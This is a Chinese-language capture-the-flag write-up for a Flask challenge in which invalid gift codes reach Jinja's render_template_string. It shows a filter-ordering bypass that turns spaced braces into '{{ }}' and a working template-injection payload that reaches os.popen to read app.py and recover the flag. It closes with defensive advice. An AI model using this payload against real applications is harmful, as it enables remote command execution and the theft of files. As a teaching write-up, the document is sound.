# Get A Gift

## 题目简述

应用接收格式类似 `ABCD-1234-xxxx` 的礼品码。无效输入会被拼进模板字符串，再交给 Jinja 的 `render_template_string` 渲染，形成服务端模板注入。

程序试图通过折叠连续花括号和删除空格阻止 `{{ ... }}`，但处理顺序存在缺陷：先提交被空格隔开的 `{ {` 与 `} }`，折叠规则看不到连续括号；随后删除空格，反而由过滤器自己生成合法的双花括号。

## 解题过程

关键源码为：

```python
regex = r"[A-Z]{4}-[0-9]{4}-.{4,}"
code = request.form["code"]
code = re.sub(
    "[ ]+",
    "",
    re.sub(r"[}]+", "}", re.sub(r"[{]+", "{", code)),
)

if not re.match(regex, code):
    return render_template_string(...)

if code == app.valid_code:
    return render_template_string(...)
else:
    return render_template_string(
        page % ("Invalid code", "The code <pre>%s</pre> is invalid." % code)
    )
```

这里有三个关键点：

1. 正则没有使用结束锚点，第三段可以携带任意长内容。
2. `re.match` 只要求从字符串开头匹配。
3. 无效礼品码未经转义就进入第二次 Jinja 模板解析。

先用算术表达式验证过滤绕过：

```text
TEST-1234-abcdef{ {7*7} }
```

连续花括号折叠发生时，两对括号中间仍有空格；删除空格后，服务端实际渲染：

```text
TEST-1234-abcdef{{7*7}}
```

页面出现 `49`，确认 SSTI。

接着从 Jinja 上下文中的 `cycler` 类取得 Python 函数全局变量，再调用 `os.popen`。过滤器会删除所有空格，因此 shell 命令使用输入重定向代替 `cat app.py` 中的空格：

```text
TEST-1234-abcdef${ {self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat<app.py').read()} }
```

规范化后，表达式成为合法的：

```jinja2
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat<app.py').read()}}
```

返回的 `app.py` 中可见：

```python
app.valid_code = "SSTI-1337-Templ4Te-1nJ3cT10N"
```

最后提交这个真实礼品码，得到：

```text
N0PS{SSTI-1337-Templ4Te-1nJ3cT10N}
```

## 方法总结

- 核心技巧：利用过滤顺序把 `{ { ... } }` 在服务端规范化成 `{{ ... }}`，再通过 Jinja 对象链执行命令并读取源码。
- 识别信号：用户输入被插入模板源码而非作为模板变量传入，且过滤、格式校验与渲染之间存在多次转换。
- 复用要点：分析过滤器时必须逐步模拟每一阶段，尤其关注“先折叠、后删除分隔符”是否会产生新的危险序列。防御应固定模板并用变量传值，不能依赖黑名单清洗模板语法。
